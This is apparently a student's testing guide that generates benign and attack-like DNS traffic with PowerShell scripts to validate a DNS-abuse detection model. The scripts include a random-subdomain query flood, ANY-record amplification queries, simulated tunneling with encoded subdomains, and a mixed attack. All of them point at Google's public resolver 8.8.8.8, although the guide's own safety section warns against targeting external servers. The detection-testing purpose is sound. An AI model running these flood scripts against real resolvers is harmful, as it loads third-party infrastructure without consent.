# DNS Traffic Generation & Testing Guide

Complete guide for generating DNS attack traffic and normal traffic to test your XGBoost DNS Abuse detection model.

---

## Table of Contents
1. [Overview](#overview)
2. [Normal Traffic Generation](#normal-traffic-generation)
3. [DNS Attack Traffic Generation](#dns-attack-traffic-generation)
4. [Capture & Analysis Workflow](#capture--analysis-workflow)
5. [Model Testing](#model-testing)

---

## Overview

**Goal**: Generate controlled traffic to validate model performance:
- **Normal DNS traffic**: Should be classified as BENIGN
- **Attack DNS traffic**: Should be classified as ATTACK

**Requirements**:
- Windows PC with Npcap installed ✓
- Your CICFlowMeter tool ✓
- Network access
- Admin privileges (for packet capture)

---

## Normal Traffic Generation

### Method 1: Real Browsing (Recommended)

**Duration**: 5-10 minutes  
**Activities**:
```
1. Browse news websites (cnn.com, bbc.com)
2. Watch a short YouTube video
3. Check email (Gmail, Outlook)
4. Visit social media (Twitter, Reddit)
5. Search on Google
```

**Expected DNS behavior**:
- Low-moderate query rate (10-50 QPS)
- Mix of TCP/UDP
- Typical domains: CDNs, ad networks, analytics

**Capture command**:
```powershell
cd C:\Users\shenal\Downloads\reseraach\CIC-Flow-Meter-DNS\target
java -jar .\net-traffic-analysis-1.0-SNAPSHOT.jar -i "\Device\NPF_{YOUR_INTERFACE}" -o "C:\Users\shenal\Downloads\reseraach\Attacks\benign_browsing.csv"
```

---

### Method 2: Automated Normal DNS Queries

Use PowerShell to generate realistic DNS queries:

```powershell
# Save as: generate_normal_dns.ps1

Write-Host "[*] Generating normal DNS traffic..."
Write-Host "[*] Duration: 60 seconds"
Write-Host "[*] Rate: ~5 queries per second"

$domains = @(
    "google.com", "youtube.com", "facebook.com",
    "amazon.com", "microsoft.com", "apple.com",
    "twitter.com", "instagram.com", "netflix.com",
    "github.com", "stackoverflow.com", "reddit.com",
    "linkedin.com", "wikipedia.org", "bbc.com",
    "cnn.com", "nytimes.com", "espn.com"
)

$start = Get-Date
$duration = 60  # seconds

while (((Get-Date) - $start).TotalSeconds -lt $duration) {
    $domain = Get-Random -InputObject $domains
    Resolve-DnsName $domain -QuickTimeout -ErrorAction SilentlyContinue | Out-Null
    
    # Random delay: 100-300ms (realistic)
    Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 300)
}

Write-Host "[OK] Normal traffic generation complete"
```

**Run**:
```powershell
powershell -ExecutionPolicy Bypass -File generate_normal_dns.ps1
```

---

## DNS Attack Traffic Generation

> **⚠️ WARNING**: Only generate attack traffic in isolated test environments or with permission!

### Attack Type 1: DNS Query Flood (High Volume)

Simulates volumetric DNS flood attacks.

```powershell
# Save as: dns_query_flood.ps1

Write-Host "[ATTACK] DNS Query Flood - Starting..."
Write-Host "[*] Target: 8.8.8.8 (Google DNS)"
Write-Host "[*] Rate: ~100-500 QPS"
Write-Host "[*] Duration: 30 seconds"

$start = Get-Date
$duration = 30
$counter = 0

# Random subdomains for variety
$prefixes = @("www", "mail", "ftp", "test", "dev", "api", "cdn", "static")
$base_domains = @("example.com", "test.org", "sample.net")

while (((Get-Date) - $start).TotalSeconds -lt $duration) {
    # Generate random query
    $prefix = Get-Random -InputObject $prefixes
    $domain = Get-Random -InputObject $base_domains
    $random_subdomain = "$prefix$(Get-Random -Minimum 1000 -Maximum 9999).$domain"
    
    # Rapid-fire query (no delay = flood)
    Resolve-DnsName $random_subdomain -Server 8.8.8.8 -QuickTimeout -ErrorAction SilentlyContinue | Out-Null
    $counter++
    
    # Minimal delay for true flood effect
    Start-Sleep -Milliseconds 10
}

$qps = $counter / $duration
Write-Host "[OK] Flood complete. Sent $counter queries ($([math]::Round($qps, 2)) QPS)"
```

**Expected Features**:
- High `dns_queries_per_second` (100-500)
- Low `flow_iat_mean` (rapid queries)
- Low `packet_size_std` (uniform queries)

---

### Attack Type 2: DNS Amplification Attack Simulation

Simulates requesting large responses (amplification).

```powershell
# Save as: dns_amplification.ps1

Write-Host "[ATTACK] DNS Amplification Simulation - Starting..."
Write-Host "[*] Query Type: ANY (deprecated, large responses)"
Write-Host "[*] Duration: 20 seconds"

$start = Get-Date
$duration = 20
$counter = 0

# Domains known to have large DNS records
$amp_targets = @(
    "google.com",  # Large TXT records
    "microsoft.com",
    "facebook.com"
)

while (((Get-Date) - $start).TotalSeconds -lt $duration) {
    $domain = Get-Random -InputObject $amp_targets
    
    # Request ANY record type (amplification technique)
    Resolve-DnsName $domain -Type ANY -Server 8.8.8.8 -QuickTimeout -ErrorAction SilentlyContinue | Out-Null
    $counter++
    
    # Rapid queries
    Start-Sleep -Milliseconds 20
}

Write-Host "[OK] Sent $counter amplification queries"
```

**Expected Features**:
- High `dns_amplification_factor` (>5.0)
- `dns_any_query_ratio` = 1.0 (all ANY queries)
- Large `dns_response_bytes`

---

### Attack Type 3: DNS Tunneling Simulation (Low-Rate)

> **Note**: This is for your team member's component, but useful for comparison.

```powershell
# Save as: dns_tunneling.ps1

Write-Host "[ATTACK] DNS Tunneling Simulation - Starting..."
Write-Host "[*] Technique: Long subdomains (data exfiltration)"
Write-Host "[*] Duration: 30 seconds"

$start = Get-Date
$duration = 30
$counter = 0

while (((Get-Date) - $start).TotalSeconds -lt $duration) {
    # Generate long random subdomain (data encoding)
    $data = -join ((65..90) + (97..122) | Get-Random -Count 32 | % {[char]$_})
    $tunnel_query = "$data.tunnel.example.com"
    
    Resolve-DnsName $tunnel_query -Server 8.8.8.8 -QuickTimeout -ErrorAction SilentlyContinue | Out-Null
    $counter++
    
    # Moderate rate (not flood, but persistent)
    Start-Sleep -Milliseconds 100
}

Write-Host "[OK] Sent $counter tunneling queries"
```

**Expected**: Your model may NOT flag this (it's not Infrastructure attack)

---

### Attack Type 4: Mixed Infrastructure Attack

Combines multiple attack indicators.

```powershell
# Save as: dns_mixed_attack.ps1

Write-Host "[ATTACK] Mixed DNS Infrastructure Attack - Starting..."
Write-Host "[*] Combines: High volume + Amplification"
Write-Host "[*] Duration: 30 seconds"

$start = Get-Date
$duration = 30
$counter_flood = 0
$counter_amp = 0

$flood_domains = @("test$((Get-Random -Minimum 1000 -Maximum 9999)).example.com")
$amp_domains = @("google.com", "microsoft.com")

while (((Get-Date) - $start).TotalSeconds -lt $duration) {
    # Alternate between flood and amplification
    if ((Get-Random -Minimum 0 -Maximum 2) -eq 0) {
        # Flood query
        $random = Get-Random -Minimum 10000 -Maximum 99999
        Resolve-DnsName "flood$random.test.com" -Server 8.8.8.8 -QuickTimeout -ErrorAction SilentlyContinue | Out-Null
        $counter_flood++
    } else {
        # Amplification query
        $domain = Get-Random -InputObject $amp_domains
        Resolve-DnsName $domain -Type ANY -Server 8.8.8.8 -QuickTimeout -ErrorAction SilentlyContinue | Out-Null
        $counter_amp++
    }
    
    # Rapid fire
    Start-Sleep -Milliseconds 15
}

Write-Host "[OK] Sent $counter_flood flood + $counter_amp amplification queries"
```

**Expected**: **HIGH confidence ATTACK prediction** (multiple indicators)

---

## Capture & Analysis Workflow

### Step 1: Start Packet Capture

**Open TWO terminals** (Run as Administrator):

**Terminal 1** - Start CICFlowMeter:
```powershell
cd C:\Users\shenal\Downloads\reseraach\CIC-Flow-Meter-DNS\target

# For normal traffic
java -jar .\net-traffic-analysis-1.0-SNAPSHOT.jar -i "\Device\NPF_{YOUR_INTERFACE}" -o "C:\Users\shenal\Downloads\reseraach\Attacks\test_normal.csv"

# For attack traffic
java -jar .\net-traffic-analysis-1.0-SNAPSHOT.jar -i "\Device\NPF_{YOUR_INTERFACE}" -o "C:\Users\shenal\Downloads\reseraach\Attacks\test_attack.csv"
```

**Terminal 2** - Generate traffic:
```powershell
# Wait 5 seconds after starting capture, then run:

# For normal
powershell -ExecutionPolicy Bypass -File generate_normal_dns.ps1

# For attack
powershell -ExecutionPolicy Bypass -File dns_query_flood.ps1
```

### Step 2: Stop Capture

Press `Ctrl+C` in Terminal 1 after traffic generation completes.

### Step 3: Fix CSV (if needed)

```powershell
cd C:\Users\shenal\Downloads\reseraach\CIC-Flow-Meter-DNS
python final_fix_csv.py
# Update the input/output paths in the script first
```

---

## Model Testing

### Test Normal Traffic

```powershell
# Update test_saved_model.py:
# TEST_DATA_PATH = r'C:\Users\shenal\Downloads\reseraach\Attacks\test_normal.csv'

python test_saved_model.py
```

**Expected Results**:
- **BENIGN**: >60% (ideally >80%)
- **ATTACK**: <40%

**If high false positives**: Lower the threshold (see recommendations)

---

### Test Attack Traffic

```powershell
# Update test_saved_model.py:
# TEST_DATA_PATH = r'C:\Users\shenal\Downloads\reseraach\Attacks\test_attack.csv'

python test_saved_model.py
```

**Expected Results**:
- **ATTACK**: >90% (ideally >95%)
- **BENIGN**: <10%

**If high false negatives**: Model may need retraining with more attack samples

---

## Quick Testing Matrix

| Traffic Type | Script | Expected ATTACK % | Model Focus |
|-------------|--------|------------------|-------------|
| **Normal Browsing** | (manual) | <40% | Should detect as BENIGN |
| **Normal Automated** | `generate_normal_dns.ps1` | <30% | Should detect as BENIGN |
| **Query Flood** | `dns_query_flood.ps1` | >90% | ✓ Infrastructure Attack |
| **Amplification** | `dns_amplification.ps1` | >85% | ✓ Infrastructure Attack |
| **Tunneling** | `dns_tunneling.ps1` | 30-60% | ✗ Not this model's focus |
| **Mixed Attack** | `dns_mixed_attack.ps1` | >95% | ✓ Strong Infrastructure Attack |

---

## Troubleshooting

### Issue: Model predicts everything as BENIGN for attack traffic

**Causes**:
- Attack traffic not aggressive enough
- Increase query rate in scripts (reduce `Start-Sleep`)
- Check `dns_queries_per_second` in CSV

**Fix**:
```powershell
# In attack scripts, reduce delay:
Start-Sleep -Milliseconds 5  # More aggressive
```

---

### Issue: Model predicts everything as ATTACK for normal traffic

**Causes**:
- Normal traffic too aggressive (video streaming, downloads)
- Model threshold too sensitive

**Fix**:
```python
# In test_saved_model.py, add after line 148:
threshold = 0.7  # More conservative
y_pred = (y_pred_proba[:, 1] >= threshold).astype(int)
```

---

### Issue: CSV has trailing commas

**Fix**:
```powershell
python final_fix_csv.py
# Update paths in script first
```

---

## Best Practices

1. **Capture duration**: 30-60 seconds minimum
2. **Multiple runs**: Generate 3-5 captures per traffic type
3. **Vary attack rates**: Test low/medium/high intensity
4. **Label your CSVs**: Use descriptive names (e.g., `benign_browsing_run1.csv`)
5. **Document results**: Track prediction accuracy for each test

---

## Safety & Ethics

⚠️ **IMPORTANT**:
- Only generate attack traffic in **isolated test environments**
- Do NOT target external DNS servers without permission
- Use local DNS resolver or controlled test DNS server
- Do NOT perform these tests on production networks
- Comply with your organization's security policies

---

## Next Steps

1. Save the PowerShell scripts to your project directory
2. Start with normal traffic generation and testing
3. Progress to attack traffic (query flood first)
4. Compare model predictions with expected results
5. Document findings in a testing report

**Good luck with your testing!** 🚀
